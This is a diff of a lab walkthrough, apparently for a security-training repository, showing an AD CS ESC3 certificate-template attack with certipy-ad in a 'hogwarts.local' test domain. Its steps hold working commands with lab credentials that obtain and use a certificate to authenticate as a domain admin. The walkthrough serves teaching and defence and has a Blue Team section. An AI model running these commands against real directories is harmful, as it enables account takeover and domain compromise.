@@ -118,18 +118,29 @@ HOGWARTS\severus.snape is a domain admin user. <br>
 ```console
 # certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'ESC3_Template' -target CERT01.hogwarts.local
 ```
-<b>-ca</b>         : Specify CA.<br>
-<b>-template</b>   : Specify template name. <br>
+<b>-ca</b>         : Specifies CA.<br>
+<b>-template</b>   : Specifies template name. <br>
 <b>-target</b>     : DNS name of the CA. <br>
+
+<img src="https://github.com/user-attachments/assets/8c90d57e-2b54-473d-8ff3-608de90dafd5">
 
 ### Step3-Request a Certificate on Behalf of Domain Admin User
 
 ```console
 # certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'User' -target CERT01.hogwarts.local -pfx harry.potter.pfx -on-behalf-of 'HOGWARTS\severus.snape' -debug
 ```
-
 <b>-on-behalf-of</b>        : Indicates on whose behalf the certificate is requested (Format: <b>HOGWARTS\severus.snape</b> or <b>severus.snape@hogwarts[.]local</b>)<br>
+<b>-pfx</b>   : Specifies  Certificate Request Agent certificate  <br>
+<b>-template</b>   : Value is <b>User</b> because we are using User's Certificate Request Agent pfx file.  <br>
 
+<img src="https://github.com/user-attachments/assets/d380b4c1-600a-4419-89a9-dabbf03ebcb6">
+
+### Step4-Use the New Certificate to Authenticate as Domain Admin User
+
+```console
+# certipy-ad auth -pfx severus.snape.pfx -dc-ip 192.168.0.111
+```
+<img src="https://github.com/user-attachments/assets/7c89e70d-01cb-4678-8dc7-3a2b3ae418ab">
 
 ## Blue Team Activity
 
